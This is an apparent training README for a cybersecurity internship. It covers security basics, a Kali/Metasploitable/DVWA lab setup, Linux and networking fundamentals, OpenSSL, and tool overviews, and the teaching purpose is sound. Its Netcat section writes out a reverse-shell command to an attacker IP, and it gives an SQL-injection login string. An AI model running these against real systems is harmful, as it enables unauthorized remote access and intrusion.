# Task 1: Foundation & Environment Setup
## Cybersecurity & Ethical Hacking Internship Program

---

## 📋 Table of Contents
1. [Cybersecurity Basics](#cybersecurity-basics)
2. [Lab Environment Setup](#lab-environment-setup)
3. [Linux Fundamentals](#linux-fundamentals)
4. [Networking Basics](#networking-basics)
5. [Cryptography Basics](#cryptography-basics)
6. [Tool Familiarization](#tool-familiarization)
7. [Linux Cheat Sheet](#linux-cheat-sheet)

---

## 🔐 Cybersecurity Basics

### CIA Triad
The foundation of information security rests on three core principles:

#### **Confidentiality**
- Ensures information is accessible only to authorized individuals
- Implemented through: Encryption, Access Controls, Authentication
- Example: Password-protected files, encrypted communications

#### **Integrity**
- Ensures information remains accurate and unaltered
- Implemented through: Hashing, Digital Signatures, Checksums
- Example: File integrity monitoring, database constraints

#### **Availability**
- Ensures information and systems are accessible when needed
- Implemented through: Redundancy, Load Balancing, DDoS Protection
- Example: Backup systems, failover mechanisms

### Common Threat Types

#### **Phishing**
- **Description**: Deceptive emails/messages to steal credentials
- **Prevention**: User awareness training, email filtering
- **Example**: Fake banking emails requesting login credentials

#### **Malware**
- **Types**: Viruses, Trojans, Ransomware, Spyware, Adware
- **Prevention**: Antivirus software, regular updates, safe browsing
- **Impact**: Data theft, system compromise, financial loss

#### **DDoS (Distributed Denial of Service)**
- **Description**: Overwhelming servers with traffic to make them unavailable
- **Prevention**: Rate limiting, load balancers, DDoS protection services
- **Tools**: LOIC, HOIC, Botnets

#### **SQL Injection**
- **Description**: Inserting malicious SQL code into web applications
- **Prevention**: Parameterized queries, input validation
- **Example**: `' OR '1'='1' --` in login forms

#### **Brute Force Attacks**
- **Description**: Systematically trying all possible passwords
- **Prevention**: Account lockouts, strong passwords, MFA
- **Tools**: Hydra, Medusa, John the Ripper

#### **Ransomware**
- **Description**: Encrypts files and demands payment for decryption
- **Prevention**: Regular backups, patching, user training
- **Examples**: WannaCry, CryptoLocker, Petya

### Attack Vectors

#### **Social Engineering**
- **Techniques**: Pretexting, Baiting, Quid Pro Quo, Tailgating
- **Prevention**: Security awareness, verification procedures
- **Psychology**: Exploits trust, fear, curiosity, helpfulness

#### **Wireless Attacks**
- **Types**: Evil Twin, WPS attacks, WEP/WPA cracking
- **Prevention**: Strong encryption (WPA3), MAC filtering
- **Tools**: Aircrack-ng, Kismet, Wigle

#### **Insider Threats**
- **Types**: Malicious insiders, negligent employees, compromised accounts
- **Prevention**: Access controls, monitoring, background checks
- **Detection**: Behavioral analysis, data loss prevention

---

## 🖥️ Lab Environment Setup

### Virtualization Platform Setup

#### **VirtualBox Installation**
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install virtualbox virtualbox-ext-pack

# Download from: https://www.virtualbox.org/wiki/Downloads
```

#### **VMware Installation**
```bash
# VMware Workstation Pro (recommended for professional use)
# Download from: https://www.vmware.com/products/workstation-pro.html
```

### Virtual Machine Configuration

#### **Kali Linux (Attacker Machine)**
- **Download**: https://www.kali.org/get-kali/
- **Resources**: 4GB RAM, 20GB Storage (minimum)
- **Network**: Host-Only Adapter for isolated testing
- **Default Credentials**: kali:kali

#### **Metasploitable2 (Target Machine)**
- **Download**: https://sourceforge.net/projects/metasploitable/
- **Resources**: 1GB RAM, 8GB Storage
- **Network**: Host-Only Adapter (same network as Kali)
- **Default Credentials**: msfadmin:msfadmin

#### **DVWA Installation**
```bash
# On Kali Linux
sudo apt update
sudo apt install apache2 mysql-server php php-mysql php-gd libapache2-mod-php
sudo systemctl start apache2
sudo systemctl start mysql

# Download DVWA
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chown -R www-data:www-data DVWA/
sudo chmod -R 755 DVWA/

# Configure database
sudo mysql -u root -p
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'dvwa';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
EXIT;

# Access DVWA: http://localhost/DVWA
```

### Network Configuration
```bash
# Configure Host-Only Network in VirtualBox
# 1. File → Host Network Manager
# 2. Create new network (vboxnet0)
# 3. Configure IP: 192.168.56.1/24
# 4. Enable DHCP Server: 192.168.56.100-200

# Verify network connectivity
ping 192.168.56.1  # Host machine
ping 192.168.56.101  # Target VM
```

---

## 🐧 Linux Fundamentals

### File System Structure
```
/          - Root directory
├── bin/   - Essential user binaries
├── etc/   - Configuration files
├── home/  - User home directories
├── opt/   - Optional software packages
├── root/  - Root user's home directory
├── tmp/   - Temporary files
├── usr/   - User programs and data
└── var/   - Variable data (logs, databases)
```

### File Permissions

#### **Permission Types**
- **r (read)**: 4
- **w (write)**: 2  
- **x (execute)**: 1

#### **Permission Groups**
- **Owner**: First three characters
- **Group**: Middle three characters
- **Others**: Last three characters

#### **Examples**
```bash
# View permissions
ls -la filename

# Common permission patterns
chmod 755 filename    # rwxr-xr-x (executable for owner, readable for others)
chmod 644 filename    # rw-r--r-- (readable/writable for owner, readable for others)
chmod 600 filename    # rw------- (readable/writable for owner only)

# Change ownership
chown user:group filename
chown -R user:group directory/
```

### Package Management (Debian/Ubuntu)
```bash
# Update package lists
sudo apt update

# Upgrade installed packages
sudo apt upgrade

# Install packages
sudo apt install package_name

# Remove packages
sudo apt remove package_name
sudo apt purge package_name  # Also removes config files

# Search for packages
apt search keyword

# List installed packages
dpkg -l

# Install .deb packages
sudo dpkg -i package.deb
```

### Networking Commands
```bash
# Display network interfaces
ifconfig
ip addr show

# Test connectivity
ping -c 4 google.com

# Display network connections
netstat -tulpn
ss -tulpn  # Modern replacement for netstat

# Trace route to destination
traceroute google.com

# DNS lookup
nslookup google.com
dig google.com

# Display routing table
route -n
ip route show
```

---

## 🌐 Networking Basics

### OSI Model Layers

#### **Layer 1 - Physical**
- **Function**: Electrical and physical representation of data
- **Examples**: Cables, hubs, repeaters
- **Protocols**: Ethernet (physical), USB, Bluetooth

#### **Layer 2 - Data Link**
- **Function**: Node-to-node data transfer, error detection
- **Examples**: Switches, bridges, NICs
- **Protocols**: Ethernet, Wi-Fi, PPP

#### **Layer 3 - Network**
- **Function**: Routing packets between networks
- **Examples**: Routers, Layer 3 switches
- **Protocols**: IP, ICMP, ARP, OSPF

#### **Layer 4 - Transport**
- **Function**: Reliable data transfer, flow control
- **Examples**: Gateways, firewalls
- **Protocols**: TCP, UDP

#### **Layer 5 - Session**
- **Function**: Managing sessions between applications
- **Examples**: Session management in web apps
- **Protocols**: NetBIOS, RPC, PPTP

#### **Layer 6 - Presentation**
- **Function**: Data encryption, compression, translation
- **Examples**: SSL/TLS, compression algorithms
- **Protocols**: SSL/TLS, JPEG, MPEG

#### **Layer 7 - Application**
- **Function**: Network services to applications
- **Examples**: Web browsers, email clients
- **Protocols**: HTTP, HTTPS, FTP, SMTP, DNS

### TCP/IP Protocol Suite

#### **TCP (Transmission Control Protocol)**
- **Type**: Connection-oriented, reliable
- **Features**: Error checking, flow control, packet ordering
- **Use Cases**: Web browsing, email, file transfer

#### **UDP (User Datagram Protocol)**
- **Type**: Connectionless, unreliable
- **Features**: Fast, low overhead, no error checking
- **Use Cases**: DNS, DHCP, video streaming, gaming

#### **IP (Internet Protocol)**
- **IPv4**: 32-bit addresses (192.168.1.1)
- **IPv6**: 128-bit addresses (2001:db8::1)
- **Function**: Addressing and routing packets

### DNS Deep Dive

#### **DNS Record Types**
- **A**: Maps domain to IPv4 address
- **AAAA**: Maps domain to IPv6 address
- **CNAME**: Creates alias for another domain
- **MX**: Mail exchange servers
- **TXT**: Text records (SPF, DKIM, DMARC)
- **NS**: Name servers for domain

#### **DNS Query Process**
1. Client queries local DNS resolver
2. Resolver queries root DNS servers
3. Root servers respond with TLD servers
4. TLD servers respond with authoritative servers
5. Authoritative servers provide final answer

### HTTP/HTTPS Protocol

#### **HTTP Methods**
- **GET**: Retrieve data from server
- **POST**: Send data to server
- **PUT**: Update/create resource
- **DELETE**: Remove resource
- **HEAD**: Get headers only
- **OPTIONS**: Get allowed methods

#### **HTTP Status Codes**
- **2xx Success**: 200 OK, 201 Created
- **3xx Redirection**: 301 Moved Permanently, 302 Found
- **4xx Client Error**: 400 Bad Request, 401 Unauthorized, 404 Not Found
- **5xx Server Error**: 500 Internal Server Error, 502 Bad Gateway

#### **HTTPS Security**
- **Encryption**: TLS/SSL encryption
- **Authentication**: Server certificate validation
- **Integrity**: Message authentication codes

### IP Addressing and Subnetting

#### **IPv4 Classes**
- **Class A**: 1.0.0.0 - 126.0.0.0 (/8) - 16M hosts
- **Class B**: 128.0.0.0 - 191.255.0.0 (/16) - 65K hosts
- **Class C**: 192.0.0.0 - 223.255.255.0 (/24) - 254 hosts

#### **Private IP Ranges**
- **10.0.0.0/8**: 10.0.0.0 - 10.255.255.255
- **172.16.0.0/12**: 172.16.0.0 - 172.31.255.255
- **192.168.0.0/16**: 192.168.0.0 - 192.168.255.255

#### **Subnetting Example**
```
Network: 192.168.1.0/24
Subnet Mask: 255.255.255.0
Hosts per subnet: 254
First host: 192.168.1.1
Last host: 192.168.1.254
Broadcast: 192.168.1.255
```

### NAT (Network Address Translation)

#### **Types of NAT**
- **Static NAT**: One-to-one mapping
- **Dynamic NAT**: Pool of public IPs
- **PAT**: Port Address Translation (most common)

#### **Benefits**
- Conserves public IP addresses
- Provides basic security (hides internal structure)
- Allows multiple devices to share one public IP

---

## 🔒 Cryptography Basics

### Symmetric Encryption

#### **Characteristics**
- Same key for encryption and decryption
- Fast and efficient for large data
- Key distribution challenge
- Examples: AES, DES, 3DES, Blowfish

#### **AES (Advanced Encryption Standard)**
- **Key Sizes**: 128, 192, 256 bits
- **Block Size**: 128 bits
- **Modes**: ECB, CBC, CFB, OFB, GCM

### Asymmetric Encryption

#### **Characteristics**
- Different keys for encryption/decryption
- Public key encrypts, private key decrypts
- Slower than symmetric encryption
- Examples: RSA, ECC, ElGamal

#### **RSA Algorithm**
- **Key Sizes**: 1024, 2048, 4096 bits
- **Use Cases**: Digital signatures, key exchange
- **Security**: Based on factoring large prime numbers

### Hashing Functions

#### **MD5 (Message Digest 5)**
- **Output**: 128-bit hash
- **Status**: Cryptographically broken
- **Uses**: File integrity (non-security purposes)

#### **SHA Family**
- **SHA-1**: 160-bit (deprecated)
- **SHA-256**: 256-bit (current standard)
- **SHA-512**: 512-bit (higher security)

#### **Properties of Good Hash Functions**
- Deterministic
- Fast computation
- Avalanche effect (small input change = large output change)
- Irreversible (one-way function)
- Collision resistant

### Digital Certificates and SSL/TLS

#### **Digital Certificate Components**
- Subject name
- Public key
- Issuer (Certificate Authority)
- Validity period
- Digital signature

#### **Certificate Authorities (CAs)**
- **Root CAs**: Self-signed, trusted by default
- **Intermediate CAs**: Signed by root CAs
- **End-entity certificates**: Signed by intermediate CAs

#### **SSL/TLS Handshake Process**
1. Client Hello (supported cipher suites)
2. Server Hello (selected cipher suite)
3. Certificate exchange
4. Key exchange
5. Change cipher spec
6. Encrypted communication begins

### Practical OpenSSL Commands

#### **Generate RSA Key Pair**
```bash
# Generate private key
openssl genrsa -out private_key.pem 2048

# Extract public key
openssl rsa -in private_key.pem -pubout -out public_key.pem
```

#### **Encrypt/Decrypt Messages**
```bash
# Encrypt with public key
echo "Secret message" | openssl rsautl -encrypt -pubin -inkey public_key.pem | base64

# Decrypt with private key
echo "encrypted_base64_message" | base64 -d | openssl rsautl -decrypt -inkey private_key.pem
```

#### **Generate Hashes**
```bash
# MD5 hash
echo -n "Hello World" | openssl md5

# SHA256 hash
echo -n "Hello World" | openssl sha256

# Hash a file
openssl sha256 filename.txt
```

#### **Certificate Operations**
```bash
# View certificate details
openssl x509 -in certificate.crt -text -noout

# Test SSL connection
openssl s_client -connect google.com:443

# Generate self-signed certificate
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
```

---

## 🛠️ Tool Familiarization

### Wireshark (Packet Capture & Analysis)

#### **Key Features**
- Real-time packet capture
- Protocol analysis for 2000+ protocols
- Rich filtering capabilities
- Statistical analysis

#### **Common Filters**
```
http                    # HTTP traffic only
tcp.port == 80         # Traffic on port 80
ip.src == 192.168.1.1  # Traffic from specific IP
dns                    # DNS queries and responses
tcp.flags.syn == 1     # TCP SYN packets
```

#### **Capture Filters vs Display Filters**
- **Capture Filters**: Applied during capture (Berkeley Packet Filter syntax)
- **Display Filters**: Applied after capture (Wireshark syntax)

### Nmap (Network Scanning)

#### **Scan Types**
```bash
# TCP SYN Scan (stealth scan)
nmap -sS target

# TCP Connect Scan
nmap -sT target

# UDP Scan
nmap -sU target

# Comprehensive scan
nmap -sS -sU -O -sV -A target
```

#### **Host Discovery**
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# No ping (assume host is up)
nmap -Pn target

# TCP SYN ping
nmap -PS22,80,443 target
```

#### **Advanced Options**
```bash
# Service version detection
nmap -sV target

# OS detection
nmap -O target

# Script scanning
nmap -sC target
nmap --script vuln target

# Timing and stealth
nmap -T4 target  # Faster timing
nmap -T1 target  # Slower, stealthy timing
```

### Burp Suite (Web Application Security)

#### **Key Components**
- **Proxy**: Intercepts HTTP/HTTPS traffic
- **Scanner**: Automated vulnerability scanning
- **Intruder**: Automated attacks (fuzzing, brute force)
- **Repeater**: Manual request modification and resending
- **Sequencer**: Analyzes randomness of tokens

#### **Proxy Configuration**
```
1. Configure browser proxy: 127.0.0.1:8080
2. Install Burp CA certificate
3. Enable intercept mode
4. Browse target application
```

#### **Common Use Cases**
- Parameter manipulation
- Session token analysis
- SQL injection testing
- Authentication bypass
- File upload vulnerabilities

### Netcat (Network Debugging)

#### **Basic Usage**
```bash
# Listen on port
nc -l -p 4444

# Connect to remote host
nc target_ip 4444

# File transfer
nc -l -p 4444 > received_file    # Receiver
nc target_ip 4444 < file_to_send # Sender

# Banner grabbing
nc target_ip 80
echo "GET / HTTP/1.0\r\n\r\n" | nc target_ip 80

# Reverse shell (for authorized testing only)
nc -e /bin/bash attacker_ip 4444  # On target
nc -l -p 4444                     # On attacker
```

#### **Advanced Features**
- UDP communication (-u flag)
- Port scanning (-z flag)
- Timeout specification (-w flag)
- Verbose output (-v flag)

---

## 📝 Linux Cheat Sheet

### File System Navigation
```bash
# Current directory
pwd

# List files and directories
ls                    # Basic listing
ls -la               # Detailed listing with hidden files
ls -lh               # Human-readable file sizes
ls -lt               # Sort by modification time
ls -lS               # Sort by file size

# Change directory
cd /path/to/directory
cd ..                # Parent directory
cd ~                 # Home directory
cd -                 # Previous directory

# Create directories
mkdir directory_name
mkdir -p path/to/nested/directories

# Remove directories
rmdir empty_directory
rm -rf directory_with_contents
```

### File Operations
```bash
# Create empty file
touch filename

# Copy files/directories
cp source destination
cp -r source_directory destination_directory

# Move/rename files
mv source destination

# Remove files
rm filename
rm -i filename       # Interactive mode
rm -f filename       # Force removal

# View file contents
cat filename         # Display entire file
less filename        # Page through file
head filename        # First 10 lines
tail filename        # Last 10 lines
tail -f filename     # Follow file changes

# Search within files
grep "pattern" filename
grep -r "pattern" directory/
grep -i "pattern" filename    # Case insensitive
grep -n "pattern" filename    # Show line numbers
```

### File Permissions and Ownership
```bash
# View permissions
ls -la filename

# Change permissions (numeric)
chmod 755 filename   # rwxr-xr-x
chmod 644 filename   # rw-r--r--
chmod 600 filename   # rw-------

# Change permissions (symbolic)
chmod u+x filename   # Add execute for owner
chmod g-w filename   # Remove write for group
chmod o+r filename   # Add read for others
chmod a+x filename   # Add execute for all

# Change ownership
chown user filename
chown user:group filename
chown -R user:group directory/

# Change group
chgrp group filename
```

### Process Management
```bash
# View running processes
ps                   # Current user processes
ps aux               # All processes
ps -ef               # Full format listing

# Real-time process monitoring
top
htop                 # Enhanced version

# Find processes by name
ps aux | grep process_name
pgrep process_name

# Kill processes
kill PID
kill -9 PID          # Force kill
killall process_name
pkill process_name

# Background and foreground jobs
command &            # Run in background
jobs                 # List background jobs
fg %1                # Bring job 1 to foreground
bg %1                # Send job 1 to background
nohup command &      # Run command immune to hangups
```

### Network Commands
```bash
# Display network interfaces
ifconfig
ip addr show
ip link show

# Configure network interface
sudo ifconfig eth0 192.168.1.100 netmask 255.255.255.0
sudo ip addr add 192.168.1.100/24 dev eth0

# Routing
route -n             # Display routing table
ip route show
sudo route add default gw 192.168.1.1
sudo ip route add default via 192.168.1.1

# Network testing
ping host
ping -c 4 host       # Send 4 packets
traceroute host
mtr host             # Continuous traceroute

# Port scanning and connections
netstat -tulpn       # All listening ports
ss -tulpn            # Modern alternative to netstat
lsof -i :80          # What's using port 80
telnet host port     # Test connectivity to port
```

### Archive and Compression
```bash
# Create archives
tar -cvf archive.tar files/
tar -czvf archive.tar.gz files/    # With gzip compression
tar -cjvf archive.tar.bz2 files/   # With bzip2 compression

# Extract archives
tar -xvf archive.tar
tar -xzvf archive.tar.gz
tar -xjvf archive.tar.bz2

# Zip and unzip
zip -r archive.zip directory/
unzip archive.zip
unzip -l archive.zip             # List contents
```

### System Information
```bash
# System information
uname -a             # System information
hostnamectl          # Hostname and system info
uptime               # System uptime
who                  # Logged in users
w                    # Detailed user activity

# Hardware information
lscpu                # CPU information
free -h              # Memory usage
df -h                # Disk space
lsblk                # Block devices
lsusb                # USB devices
lspci                # PCI devices

# System monitoring
vmstat               # Virtual memory statistics
iostat               # I/O statistics
sar                  # System activity reporter
```

### Text Processing
```bash
# Sort and unique
sort filename
sort -n filename     # Numeric sort
sort -r filename     # Reverse sort
uniq filename        # Remove duplicates
sort filename | uniq # Sort and remove duplicates

# Cut and paste
cut -d: -f1 /etc/passwd         # Extract first field
cut -c1-10 filename             # Extract characters 1-10
paste file1 file2               # Merge files side by side

# Stream editing
sed 's/old/new/g' filename      # Replace all occurrences
sed '1d' filename               # Delete first line
sed -n '1,5p' filename          # Print lines 1-5

# Pattern processing
awk '{print $1}' filename       # Print first column
awk -F: '{print $1}' /etc/passwd # Use : as delimiter
awk 'NR==1' filename            # Print first line
```

### Find and Locate
```bash
# Find files and directories
find /path -name "filename"
find /path -name "*.txt"
find /path -type f -size +100M    # Files larger than 100MB
find /path -type d                # Directories only
find /path -user username         # Files owned by user
find /path -perm 755              # Files with specific permissions

# Execute commands on found files
find /path -name "*.log" -exec rm {} \;
find /path -name "*.txt" -exec grep "pattern" {} \;

# Locate command (faster, uses database)
locate filename
updatedb             # Update locate database
```

### Environment and Variables
```bash
# Environment variables
env                  # Display all environment variables
echo $HOME           # Display specific variable
export VAR=value     # Set environment variable
unset VAR            # Remove environment variable

# Path manipulation
echo $PATH
export PATH=$PATH:/new/path

# Command history
history              # Show command history
!n                   # Execute command number n
!!                   # Execute last command
!string              # Execute last command starting with string

# Aliases
alias ll='ls -la'
alias ..='cd ..'
unalias ll           # Remove alias
```

### Package Management (Ubuntu/Debian)
```bash
# Update package database
sudo apt update

# Upgrade packages
sudo apt upgrade
sudo apt full-upgrade

# Install packages
sudo apt install package_name
sudo apt install -y package_name  # Automatic yes

# Remove packages
sudo apt remove package_name
sudo apt purge package_name       # Also remove config files
sudo apt autoremove               # Remove unused dependencies

# Search packages
apt search keyword
apt show package_name

# Package information
dpkg -l                          # List installed packages
dpkg -l | grep package_name      # Search installed packages
dpkg -L package_name             # List files installed by package
```

### Log Files and System Monitoring
```bash
# Common log locations
/var/log/syslog      # System log
/var/log/auth.log    # Authentication log
/var/log/kern.log    # Kernel log
/var/log/apache2/    # Apache logs
/var/log/nginx/      # Nginx logs

# View logs
tail -f /var/log/syslog          # Follow system log
journalctl                       # Systemd journal
journalctl -u service_name       # Logs for specific service
journalctl -f                    # Follow journal
```

### Cron Jobs (Scheduled Tasks)
```bash
# Edit crontab
crontab -e

# List crontab
crontab -l

# Crontab format: minute hour day month day_of_week command
# Examples:
0 2 * * * /path/to/script.sh     # Daily at 2:00 AM
*/15 * * * * /path/to/script.sh  # Every 15 minutes
0 0 1 * * /path/to/script.sh     # First day of every month
```

---

## 📚 Additional Resources

### Recommended Reading
- "The Web Application Hacker's Handbook" by Dafydd Stuttard
- "Hacking: The Art of Exploitation" by Jon Erickson
- "Network Security Assessment" by Chris McNab
- "Linux Command Line and Shell Scripting Bible" by Richard Blum

### Online Platforms
- **TryHackMe**: Hands-on cybersecurity training
- **HackTheBox**: Penetration testing labs
- **VulnHub**: Vulnerable VMs for practice
- **OWASP**: Web application security resources

### Certifications to Consider
- **CompTIA Security+**: Entry-level security certification
- **CEH**: Certified Ethical Hacker
- **OSCP**: Offensive Security Certified Professional
- **CISSP**: Information security management

---

## 📋 Lab Setup Checklist

- [ ] VirtualBox/VMware installed and configured
- [ ] Kali Linux VM created and updated
- [ ] Metasploitable2 VM deployed
- [ ] DVWA installed and configured
- [ ] Host-only network configured
- [ ] Network connectivity verified between VMs
- [ ] Wireshark test capture completed
- [ ] Nmap scan performed and documented
- [ ] Burp Suite configured with browser
- [ ] Basic Linux commands practiced
- [ ] OpenSSL encryption/decryption tested
- [ ] Documentation and screenshots organized

---

## 🎯 Key Takeaways

1. **Security is a Process**: Cybersecurity requires continuous learning and adaptation
2. **Defense in Depth**: Multiple layers of security are essential
3. **Know Your Tools**: Understanding capabilities and limitations of security tools
4. **Legal and Ethical**: Always obtain proper authorization before testing
5. **Documentation**: Proper documentation is crucial for professional security work

---

*This repository contains educational content for cybersecurity learning purposes only. All activities should be performed in controlled lab environments with proper authorization.*
